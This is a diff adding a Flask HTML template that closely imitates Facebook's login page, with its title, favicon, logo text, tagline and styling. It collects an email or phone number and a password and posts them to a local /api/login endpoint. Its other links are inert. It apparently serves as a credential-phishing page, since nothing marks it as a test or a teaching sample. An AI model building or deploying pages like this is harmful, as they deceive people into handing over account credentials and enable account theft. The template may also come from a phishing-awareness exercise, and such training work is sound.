@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body {
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .fb-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+        .fb-left {
+            max-width: 580px;
+            padding: 20px;
+        }
+        .fb-logo {
+            font-size: 56px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 10px;
+            font-family: 'SF Pro Display', Helvetica, Arial, sans-serif;
+        }
+        .fb-tagline {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1c1e21;
+            line-height: 1.3;
+        }
+        .fb-right {
+            width: 396px;
+        }
+        .fb-box {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .fb-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            margin-bottom: 12px;
+            color: #1c1e21;
+        }
+        .fb-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+        }
+        .fb-input::placeholder {
+            color: #90949c;
+        }
+        .fb-btn-login {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .fb-btn-login:hover:not(:disabled) {
+            background: #166fe5;
+        }
+        .fb-btn-login:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .fb-forgot {
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .fb-forgot:hover {
+            text-decoration: underline;
+        }
+        .fb-divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .fb-btn-create {
+            background: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 14px 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .fb-btn-create:hover {
+            background: #36a420;
+        }
+        .fb-celebrity {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        .fb-celebrity a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .fb-celebrity a:hover {
+            text-decoration: underline;
+        }
+        .fb-error {
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            color: #dd3c10;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+            text-align: left;
+        }
+        .fb-loader {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .fb-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dddfe2;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 900px) {
+            .fb-wrapper {
+                flex-direction: column;
+                gap: 20px;
+            }
+            .fb-left {
+                text-align: center;
+                max-width: 400px;
+            }
+            .fb-tagline {
+                font-size: 22px;
+            }
+            .fb-right {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="fb-wrapper">
+        <!-- Left Side -->
+        <div class="fb-left">
+            <div class="fb-logo">facebook</div>
+            <div class="fb-tagline">Connect with friends and the world around you on Facebook.</div>
+        </div>
+        
+        <!-- Right Side -->
+        <div class="fb-right">
+            <div class="fb-box">
+                <div id="login-error" class="fb-error"></div>
+                
+                <form id="login-form" method="POST" action="/api/login">
+                    <input type="text" 
+                           id="username" 
+                           name="username" 
+                           class="fb-input" 
+                           placeholder="Email or phone number" 
+                           autocomplete="username"
+                           required>
+                    
+                    <input type="password" 
+                           id="password" 
+                           name="password" 
+                           class="fb-input" 
+                           placeholder="Password" 
+                           autocomplete="current-password"
+                           required>
+                    
+                    <button type="submit" id="login-submit" class="fb-btn-login">Log In</button>
+                </form>
+                
+                <div id="login-loader" class="fb-loader">
+                    <div class="fb-spinner"></div>
+                </div>
+                
+                <a href="#" class="fb-forgot" onclick="return false;">Forgot password?</a>
+                
+                <div class="fb-divider"></div>
+                
+                <a href="#" class="fb-btn-create" onclick="return false;">Create new account</a>
+            </div>
+            
+            <div class="fb-celebrity">
+                <a href="#" onclick="return false;">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+    
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
